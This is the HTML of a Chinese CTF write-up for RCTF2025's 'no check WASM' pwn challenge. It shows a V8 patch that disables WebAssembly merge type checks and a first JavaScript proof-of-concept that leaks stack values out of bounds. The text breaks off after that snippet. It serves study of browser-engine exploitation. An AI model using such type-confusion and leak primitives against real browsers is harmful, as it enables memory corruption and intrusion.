<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>RCTF2025 Pwn 部分题 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="RCTF2025 Pwn 部分题 Writeup | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/RCTF-2025-Pwn-Writeup/"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./exp.js" class="file-link"><img src="/icons/text.png" alt loading="lazy" decoding="async"/><span>exp.js</span></a><div class="file-meta"><span>84.5 KiB</span><span class="file-meta-date">1970-01-01 07:59</span></div></div><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt loading="lazy" decoding="async"/><span>README.mdx</span></a><div class="file-meta"><span>8.83 KiB</span><span class="file-meta-date">2025-11-19 22:03</span></div></div><div class="file"><a href="./wasm-module-builder.js" class="file-link"><img src="/icons/text.png" alt loading="lazy" decoding="async"/><span>wasm-module-builder.js</span></a><div class="file-meta"><span>79.1 KiB</span><span class="file-meta-date">1970-01-01 07:59</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="rctr2025-pwn" class="scroll-target"><a href="#rctr2025-pwn"><code class="hash inline-code">#</code>RCTR2025 Pwn 部分题解</a></h1>
<p>这周末被半期硬控了，众所周知 ctfer 平常都是不听课的，所以我用了两天半速成了大物，这场比赛也没什么输出，赛后复现一下题目。</p>
<h2 id="no-check-wasm" class="scroll-target"><a href="#no-check-wasm"><code class="hash inline-code">#</code>no check WASM</a></h2>
<p>先看 diff 文件：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-diff language-diff"><span style="color:#393A34">...</span><br><span style="color:#005CC5">diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#393A34">index b65ba5b9675..163fc536138 100644</span><br><span style="color:#999999">---</span><span style="color:#B31D28"> a/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#999999">+++</span><span style="color:#22863A"> b/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#999999;font-weight:bold">@@</span><span style="color:#6F42C1;font-weight:bold"> -7878,27 +7878,27 </span><span style="color:#999999;font-weight:bold">@@</span><span style="color:#393A34"> class WasmFullDecoder : public WasmDecoder</span><span style="color:#393A34">&#x3C;</span><span style="color:#393A34">ValidationTag, decoding_mode</span><span style="color:#393A34">></span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#393A34">     // if the current code is reachable even if it is spec-only reachable.</span><br><span style="color:#393A34">     if </span><span style="color:#1e754f">(</span><span style="color:#393A34">V8_LIKELY</span><span style="color:#a65e2b">(</span><span style="color:#393A34">decoding_mode == kConstantExpression ||</span><br><span style="color:#393A34">                   !control_.back</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#393A34">.unreachable</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#393A34"> </span><span style="color:#1e754f">{</span><br><span style="color:#B31D28">-      if </span><span style="color:#a65e2b">(</span><span style="color:#B31D28">V8_UNLIKELY</span><span style="color:#a13865">(</span><span style="color:#B31D28">strict_count ? actual != arity : actual </span><span style="color:#B31D28">&#x3C;</span><span style="color:#B31D28"> arity</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#B31D28"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B31D28">-        this-</span><span style="color:#B31D28">></span><span style="color:#B31D28">DecodeError</span><span style="color:#a13865">(</span><span style="color:#B31D28">"expected %u elements on the stack for %s, found %u",</span><br><span style="color:#B31D28">-                          arity, merge_description, actual</span><span style="color:#a13865">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-        return false;</span><br><span style="color:#B31D28">-      </span><span style="color:#a65e2b">}</span><br><span style="color:#B31D28">-      // Typecheck the topmost </span><span style="color:#a65e2b">{</span><span style="color:#B31D28">merge-</span><span style="color:#B31D28">></span><span style="color:#B31D28">arity</span><span style="color:#a65e2b">}</span><span style="color:#B31D28"> values on the stack.</span><br><span style="color:#B31D28">-      Value* stack_values = stack_.end</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#B31D28"> - arity;</span><br><span style="color:#B31D28">-      for </span><span style="color:#a65e2b">(</span><span style="color:#B31D28">uint32_t i = 0; i </span><span style="color:#B31D28">&#x3C;</span><span style="color:#B31D28"> arity; ++i</span><span style="color:#a65e2b">)</span><span style="color:#B31D28"> </span><span style="color:#a65e2b">{</span><br><span style="color:#B31D28">-        Value&#x26; val = stack_values</span><span style="color:#a13865">[</span><span style="color:#B31D28">i</span><span style="color:#a13865">]</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-        Value&#x26; old = </span><span style="color:#a13865">(</span><span style="color:#B31D28">*merge</span><span style="color:#a13865">)</span><span style="color:#a13865">[</span><span style="color:#B31D28">i</span><span style="color:#a13865">]</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-        if </span><span style="color:#a13865">(</span><span style="color:#B31D28">!IsSubtypeOf</span><span style="color:#bda437">(</span><span style="color:#B31D28">val.type, old.type, this-</span><span style="color:#B31D28">></span><span style="color:#B31D28">module_</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#B31D28"> </span><span style="color:#a13865">{</span><br><span style="color:#B31D28">-          this-</span><span style="color:#B31D28">></span><span style="color:#B31D28">DecodeError</span><span style="color:#bda437">(</span><span style="color:#B31D28">"type error in %s</span><span style="color:#296aa3">[</span><span style="color:#B31D28">%u</span><span style="color:#296aa3">]</span><span style="color:#B31D28"> </span><span style="color:#296aa3">(</span><span style="color:#B31D28">expected %s, got %s</span><span style="color:#296aa3">)</span><span style="color:#B31D28">",</span><br><span style="color:#B31D28">-                            merge_description, i, old.type.name</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#B31D28">.c_str</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#B31D28">,</span><br><span style="color:#B31D28">-                            val.type.name</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#B31D28">.c_str</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#B31D28">;</span><br><span style="color:#B31D28">-          return false;</span><br><span style="color:#B31D28">-        </span><span style="color:#a13865">}</span><br><span style="color:#B31D28">-        if constexpr </span><span style="color:#a13865">(</span><span style="color:#B31D28">static_cast</span><span style="color:#B31D28">&#x3C;</span><span style="color:#B31D28">bool</span><span style="color:#B31D28">></span><span style="color:#bda437">(</span><span style="color:#B31D28">rewrite_types</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#B31D28"> </span><span style="color:#a13865">{</span><br><span style="color:#B31D28">-          // Upcast type on the stack to the target type of the label.</span><br><span style="color:#B31D28">-          val.type = old.type;</span><br><span style="color:#B31D28">-        </span><span style="color:#a13865">}</span><br><span style="color:#B31D28">-      </span><span style="color:#a65e2b">}</span><br><span style="color:#22863A">+      // if </span><span style="color:#a65e2b">(</span><span style="color:#22863A">V8_UNLIKELY</span><span style="color:#a13865">(</span><span style="color:#22863A">strict_count ? actual != arity : actual </span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A"> arity</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> </span><span style="color:#a65e2b">{</span><br><span style="color:#22863A">+      //   this-</span><span style="color:#22863A">></span><span style="color:#22863A">DecodeError</span><span style="color:#a13865">(</span><span style="color:#22863A">"expected %u elements on the stack for %s, found %u",</span><br><span style="color:#22863A">+      //                     arity, merge_description, actual</span><span style="color:#a13865">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+      //   return false;</span><br><span style="color:#22863A">+      // </span><span style="color:#a65e2b">}</span><br><span style="color:#22863A">+      // // Typecheck the topmost </span><span style="color:#a65e2b">{</span><span style="color:#22863A">merge-</span><span style="color:#22863A">></span><span style="color:#22863A">arity</span><span style="color:#a65e2b">}</span><span style="color:#22863A"> values on the stack.</span><br><span style="color:#22863A">+      // Value* stack_values = stack_.end</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> - arity;</span><br><span style="color:#22863A">+      // for </span><span style="color:#a65e2b">(</span><span style="color:#22863A">uint32_t i = 0; i </span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A"> arity; ++i</span><span style="color:#a65e2b">)</span><span style="color:#22863A"> </span><span style="color:#a65e2b">{</span><br><span style="color:#22863A">+      //   Value&#x26; val = stack_values</span><span style="color:#a13865">[</span><span style="color:#22863A">i</span><span style="color:#a13865">]</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+      //   Value&#x26; old = </span><span style="color:#a13865">(</span><span style="color:#22863A">*merge</span><span style="color:#a13865">)</span><span style="color:#a13865">[</span><span style="color:#22863A">i</span><span style="color:#a13865">]</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+      //   if </span><span style="color:#a13865">(</span><span style="color:#22863A">!IsSubtypeOf</span><span style="color:#bda437">(</span><span style="color:#22863A">val.type, old.type, this-</span><span style="color:#22863A">></span><span style="color:#22863A">module_</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#22863A"> </span><span style="color:#a13865">{</span><br><span style="color:#22863A">+      //     this-</span><span style="color:#22863A">></span><span style="color:#22863A">DecodeError</span><span style="color:#bda437">(</span><span style="color:#22863A">"type error in %s</span><span style="color:#296aa3">[</span><span style="color:#22863A">%u</span><span style="color:#296aa3">]</span><span style="color:#22863A"> </span><span style="color:#296aa3">(</span><span style="color:#22863A">expected %s, got %s</span><span style="color:#296aa3">)</span><span style="color:#22863A">",</span><br><span style="color:#22863A">+      //                       merge_description, i, old.type.name</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#22863A">.c_str</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#22863A">,</span><br><span style="color:#22863A">+      //                       val.type.name</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#22863A">.c_str</span><span style="color:#296aa3">(</span><span style="color:#296aa3">)</span><span style="color:#bda437">)</span><span style="color:#22863A">;</span><br><span style="color:#22863A">+      //     return false;</span><br><span style="color:#22863A">+      //   </span><span style="color:#a13865">}</span><br><span style="color:#22863A">+      //   if constexpr </span><span style="color:#a13865">(</span><span style="color:#22863A">static_cast</span><span style="color:#22863A">&#x3C;</span><span style="color:#22863A">bool</span><span style="color:#22863A">></span><span style="color:#bda437">(</span><span style="color:#22863A">rewrite_types</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#22863A"> </span><span style="color:#a13865">{</span><br><span style="color:#22863A">+      //     // Upcast type on the stack to the target type of the label.</span><br><span style="color:#22863A">+      //     val.type = old.type;</span><br><span style="color:#22863A">+      //   </span><span style="color:#a13865">}</span><br><span style="color:#22863A">+      // </span><span style="color:#a65e2b">}</span><br><span style="color:#393A34">       return true;</span><br><span style="color:#393A34">     </span><span style="color:#1e754f">}</span><br><span style="color:#393A34">     // Unreachable code validation starts here.</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-diff language-diff"><span style="color:#DBD7CAEE">...</span><br><span style="color:#79B8FF">diff --git a/src/wasm/function-body-decoder-impl.h b/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#DBD7CAEE">index b65ba5b9675..163fc536138 100644</span><br><span style="color:#666666">---</span><span style="color:#FDAEB7"> a/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#666666">+++</span><span style="color:#85E89D"> b/src/wasm/function-body-decoder-impl.h</span><br><span style="color:#666666;font-weight:bold">@@</span><span style="color:#B392F0;font-weight:bold"> -7878,27 +7878,27 </span><span style="color:#666666;font-weight:bold">@@</span><span style="color:#DBD7CAEE"> class WasmFullDecoder : public WasmDecoder</span><span style="color:#DBD7CAEE">&#x3C;</span><span style="color:#DBD7CAEE">ValidationTag, decoding_mode</span><span style="color:#DBD7CAEE">></span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">{</span><br><span style="color:#DBD7CAEE">     // if the current code is reachable even if it is spec-only reachable.</span><br><span style="color:#DBD7CAEE">     if </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">V8_LIKELY</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">decoding_mode == kConstantExpression ||</span><br><span style="color:#DBD7CAEE">                   !control_.back</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#DBD7CAEE">.unreachable</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> </span><span style="color:#4d9375">{</span><br><span style="color:#FDAEB7">-      if </span><span style="color:#d4976c">(</span><span style="color:#FDAEB7">V8_UNLIKELY</span><span style="color:#d9739f">(</span><span style="color:#FDAEB7">strict_count ? actual != arity : actual </span><span style="color:#FDAEB7">&#x3C;</span><span style="color:#FDAEB7"> arity</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#FDAEB7"> </span><span style="color:#d4976c">{</span><br><span style="color:#FDAEB7">-        this-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">DecodeError</span><span style="color:#d9739f">(</span><span style="color:#FDAEB7">"expected %u elements on the stack for %s, found %u",</span><br><span style="color:#FDAEB7">-                          arity, merge_description, actual</span><span style="color:#d9739f">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-        return false;</span><br><span style="color:#FDAEB7">-      </span><span style="color:#d4976c">}</span><br><span style="color:#FDAEB7">-      // Typecheck the topmost </span><span style="color:#d4976c">{</span><span style="color:#FDAEB7">merge-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">arity</span><span style="color:#d4976c">}</span><span style="color:#FDAEB7"> values on the stack.</span><br><span style="color:#FDAEB7">-      Value* stack_values = stack_.end</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#FDAEB7"> - arity;</span><br><span style="color:#FDAEB7">-      for </span><span style="color:#d4976c">(</span><span style="color:#FDAEB7">uint32_t i = 0; i </span><span style="color:#FDAEB7">&#x3C;</span><span style="color:#FDAEB7"> arity; ++i</span><span style="color:#d4976c">)</span><span style="color:#FDAEB7"> </span><span style="color:#d4976c">{</span><br><span style="color:#FDAEB7">-        Value&#x26; val = stack_values</span><span style="color:#d9739f">[</span><span style="color:#FDAEB7">i</span><span style="color:#d9739f">]</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-        Value&#x26; old = </span><span style="color:#d9739f">(</span><span style="color:#FDAEB7">*merge</span><span style="color:#d9739f">)</span><span style="color:#d9739f">[</span><span style="color:#FDAEB7">i</span><span style="color:#d9739f">]</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-        if </span><span style="color:#d9739f">(</span><span style="color:#FDAEB7">!IsSubtypeOf</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">val.type, old.type, this-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">module_</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#FDAEB7"> </span><span style="color:#d9739f">{</span><br><span style="color:#FDAEB7">-          this-</span><span style="color:#FDAEB7">></span><span style="color:#FDAEB7">DecodeError</span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">"type error in %s</span><span style="color:#6394bf">[</span><span style="color:#FDAEB7">%u</span><span style="color:#6394bf">]</span><span style="color:#FDAEB7"> </span><span style="color:#6394bf">(</span><span style="color:#FDAEB7">expected %s, got %s</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">",</span><br><span style="color:#FDAEB7">-                            merge_description, i, old.type.name</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">.c_str</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">,</span><br><span style="color:#FDAEB7">-                            val.type.name</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#FDAEB7">.c_str</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#FDAEB7">;</span><br><span style="color:#FDAEB7">-          return false;</span><br><span style="color:#FDAEB7">-        </span><span style="color:#d9739f">}</span><br><span style="color:#FDAEB7">-        if constexpr </span><span style="color:#d9739f">(</span><span style="color:#FDAEB7">static_cast</span><span style="color:#FDAEB7">&#x3C;</span><span style="color:#FDAEB7">bool</span><span style="color:#FDAEB7">></span><span style="color:#e6cc77">(</span><span style="color:#FDAEB7">rewrite_types</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#FDAEB7"> </span><span style="color:#d9739f">{</span><br><span style="color:#FDAEB7">-          // Upcast type on the stack to the target type of the label.</span><br><span style="color:#FDAEB7">-          val.type = old.type;</span><br><span style="color:#FDAEB7">-        </span><span style="color:#d9739f">}</span><br><span style="color:#FDAEB7">-      </span><span style="color:#d4976c">}</span><br><span style="color:#85E89D">+      // if </span><span style="color:#d4976c">(</span><span style="color:#85E89D">V8_UNLIKELY</span><span style="color:#d9739f">(</span><span style="color:#85E89D">strict_count ? actual != arity : actual </span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D"> arity</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> </span><span style="color:#d4976c">{</span><br><span style="color:#85E89D">+      //   this-</span><span style="color:#85E89D">></span><span style="color:#85E89D">DecodeError</span><span style="color:#d9739f">(</span><span style="color:#85E89D">"expected %u elements on the stack for %s, found %u",</span><br><span style="color:#85E89D">+      //                     arity, merge_description, actual</span><span style="color:#d9739f">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+      //   return false;</span><br><span style="color:#85E89D">+      // </span><span style="color:#d4976c">}</span><br><span style="color:#85E89D">+      // // Typecheck the topmost </span><span style="color:#d4976c">{</span><span style="color:#85E89D">merge-</span><span style="color:#85E89D">></span><span style="color:#85E89D">arity</span><span style="color:#d4976c">}</span><span style="color:#85E89D"> values on the stack.</span><br><span style="color:#85E89D">+      // Value* stack_values = stack_.end</span><span style="color:#d4976c">(</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> - arity;</span><br><span style="color:#85E89D">+      // for </span><span style="color:#d4976c">(</span><span style="color:#85E89D">uint32_t i = 0; i </span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D"> arity; ++i</span><span style="color:#d4976c">)</span><span style="color:#85E89D"> </span><span style="color:#d4976c">{</span><br><span style="color:#85E89D">+      //   Value&#x26; val = stack_values</span><span style="color:#d9739f">[</span><span style="color:#85E89D">i</span><span style="color:#d9739f">]</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+      //   Value&#x26; old = </span><span style="color:#d9739f">(</span><span style="color:#85E89D">*merge</span><span style="color:#d9739f">)</span><span style="color:#d9739f">[</span><span style="color:#85E89D">i</span><span style="color:#d9739f">]</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+      //   if </span><span style="color:#d9739f">(</span><span style="color:#85E89D">!IsSubtypeOf</span><span style="color:#e6cc77">(</span><span style="color:#85E89D">val.type, old.type, this-</span><span style="color:#85E89D">></span><span style="color:#85E89D">module_</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#85E89D"> </span><span style="color:#d9739f">{</span><br><span style="color:#85E89D">+      //     this-</span><span style="color:#85E89D">></span><span style="color:#85E89D">DecodeError</span><span style="color:#e6cc77">(</span><span style="color:#85E89D">"type error in %s</span><span style="color:#6394bf">[</span><span style="color:#85E89D">%u</span><span style="color:#6394bf">]</span><span style="color:#85E89D"> </span><span style="color:#6394bf">(</span><span style="color:#85E89D">expected %s, got %s</span><span style="color:#6394bf">)</span><span style="color:#85E89D">",</span><br><span style="color:#85E89D">+      //                       merge_description, i, old.type.name</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#85E89D">.c_str</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#85E89D">,</span><br><span style="color:#85E89D">+      //                       val.type.name</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#85E89D">.c_str</span><span style="color:#6394bf">(</span><span style="color:#6394bf">)</span><span style="color:#e6cc77">)</span><span style="color:#85E89D">;</span><br><span style="color:#85E89D">+      //     return false;</span><br><span style="color:#85E89D">+      //   </span><span style="color:#d9739f">}</span><br><span style="color:#85E89D">+      //   if constexpr </span><span style="color:#d9739f">(</span><span style="color:#85E89D">static_cast</span><span style="color:#85E89D">&#x3C;</span><span style="color:#85E89D">bool</span><span style="color:#85E89D">></span><span style="color:#e6cc77">(</span><span style="color:#85E89D">rewrite_types</span><span style="color:#e6cc77">)</span><span style="color:#d9739f">)</span><span style="color:#85E89D"> </span><span style="color:#d9739f">{</span><br><span style="color:#85E89D">+      //     // Upcast type on the stack to the target type of the label.</span><br><span style="color:#85E89D">+      //     val.type = old.type;</span><br><span style="color:#85E89D">+      //   </span><span style="color:#d9739f">}</span><br><span style="color:#85E89D">+      // </span><span style="color:#d4976c">}</span><br><span style="color:#DBD7CAEE">       return true;</span><br><span style="color:#DBD7CAEE">     </span><span style="color:#4d9375">}</span><br><span style="color:#DBD7CAEE">     // Unreachable code validation starts here.</span><br></code></pre></div>
<p>题如其名，出题人把 wasm 最关键的类型合流函数的栈类型检查删的差不多了，永远返回 true。</p>
<p>想要进入这个 slow path 的话需要让栈值数量与函数签名不匹配，或者是一些复杂的函数。</p>
<p>也就是说，我们可以在 js 里用 wasm 任意构造类型混淆和 oob。</p>
<p>先简单说一下，exp 里用到的很多 helper 函数都是写在 v8 源码里的（<a href="./wasm-module-builder.js" title="./wasm-module-builder.js"><code class="inline-code">./test/mjsunit/wasm/wasm-module-builder.js</code></a>），所以 poc 可以直接接着这个写。</p>
<p>比如说最简单的越界读栈上元素：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-js language-js"><span style="color:#AB5959">function</span><span style="color:#59873A"> RandomLeak</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999"> </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> sig</span><span style="color:#999999"> =</span><span style="color:#59873A"> makeSig</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">[</span><span style="color:#B07D48">kWasmI64</span><span style="color:#999999">,</span><span style="color:#B07D48"> kWasmI64</span><span style="color:#999999">,</span><span style="color:#B07D48"> kWasmF64</span><span style="color:#999999">,</span><span style="color:#B07D48"> kWasmF64</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> builder</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#59873A"> WasmModuleBuilder</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#B07D48">	builder</span><br><span style="color:#999999">		.</span><span style="color:#59873A">addFunction</span><span style="color:#1e754f">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">bad</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B07D48"> sig</span><span style="color:#1e754f">)</span><br><span style="color:#999999">		.</span><span style="color:#59873A">addBody</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><br><span style="color:#A0ADA0">			// kExprEnd,</span><br><span style="color:#999999">		</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><br><span style="color:#999999">		.</span><span style="color:#59873A">exportFunc</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> module_bytes</span><span style="color:#999999"> =</span><span style="color:#B07D48"> builder</span><span style="color:#999999">.</span><span style="color:#59873A">toBuffer</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> mod</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Module</span><span style="color:#1e754f">(</span><span style="color:#B07D48">module_bytes</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	const</span><span style="color:#B07D48"> instance</span><span style="color:#999999"> =</span><span style="color:#AB5959"> new</span><span style="color:#B07D48"> WebAssembly</span><span style="color:#999999">.</span><span style="color:#59873A">Instance</span><span style="color:#1e754f">(</span><span style="color:#B07D48">mod</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><span style="color:#a65e2b">}</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">	var</span><span style="color:#B07D48"> ret_val</span><span style="color:#999999"> =</span><span style="color:#B07D48"> instance</span><span style="color:#999999">.</span><span style="color:#B07D48">exports</span><span style="color:#999999">.</span><span style="color:#59873A">bad</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">	return</span><span style="color:#B07D48"> ret_val</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-js language-js"><span 